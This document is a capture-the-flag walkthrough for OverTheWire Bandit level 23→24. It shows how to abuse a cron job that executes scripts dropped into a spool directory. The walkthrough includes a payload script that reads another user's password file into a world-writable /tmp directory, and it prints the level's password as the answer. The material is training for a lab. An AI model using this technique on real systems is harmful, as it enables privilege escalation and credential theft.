# Bandit Level 23 → 24

## Goal

Another cron job — but this one doesn't write a password anywhere on its own. Instead, it runs **every script in `/var/spool/bandit24/foo/`** as `bandit24`, then deletes each script afterward. You have to drop your own script there, one that reads `bandit24`'s password and leaves it somewhere you can reach.

## Concepts you'll learn

- Writing a short shell script
- Making a script executable with `chmod`
- The concept of a "drop directory" where another user's cron scoops up whatever you leave
- Creating a world-writable directory for the scheduled script to write *back* into

## Walkthrough

### 1. Log in as bandit23

```bash
$ ssh bandit23@bandit.labs.overthewire.org -p 2220
```

Use the password from [level 22 → 23](level22.md).

### 2. Read the cron and the script it runs

```bash
$ cat /etc/cron.d/cronjob_bandit24
```

```
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

```bash
$ cat /usr/bin/cronjob_bandit24.sh
```

Expected output (approximately):

```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

Key observations:

- Runs as `bandit24` every minute
- `cd`s into `/var/spool/bandit24/foo` and executes every non-dotfile there, but only if the file is owned by `bandit23`
- Deletes each file after running it

So: if you drop an executable script owned by you (`bandit23`) into that directory, it'll be run as `bandit24` within a minute.

### 3. Make a working directory your script can write to

`bandit24` is a different user, so the output file needs to be somewhere `bandit24` is allowed to write. The easiest answer: create a world-writable directory under `/tmp`.

```bash
$ mkdir /tmp/mywork23
$ chmod 777 /tmp/mywork23
```

### 4. Write your payload script

```bash
$ cat > /tmp/mywork23/getpass.sh <<'EOF'
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/mywork23/bandit24.pass
chmod 666 /tmp/mywork23/bandit24.pass
EOF
$ chmod +x /tmp/mywork23/getpass.sh
```

What this does when run as `bandit24`:

- Reads `/etc/bandit_pass/bandit24` (which `bandit24` can read)
- Writes it to a file in the world-writable scratch dir
- Makes that output file world-readable so you can read it back

### 5. Drop a copy into the spool directory

The cron job demands the script be **owned by bandit23**. Because you are `bandit23`, a plain copy qualifies:

```bash
$ cp /tmp/mywork23/getpass.sh /var/spool/bandit24/foo/
```

### 6. Wait, then read the result

The cron fires at the top of every minute. Give it up to 60 seconds:

```bash
$ sleep 65
$ cat /tmp/mywork23/bandit24.pass
```

Expected output: `bandit24`'s password.

If the file doesn't exist yet, check `ls /var/spool/bandit24/foo/` — if your script is still there, the cron hasn't fired; if it's gone, it ran and your output file should be present.

### 7. Log in as bandit24

```bash
$ ssh bandit24@bandit.labs.overthewire.org -p 2220
```

## The answer

The password for `bandit24` is:

**`gb8KRRCsshuZXI0tUuR6ppOFOqa0ejqU`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/bandit/bandit23.html>
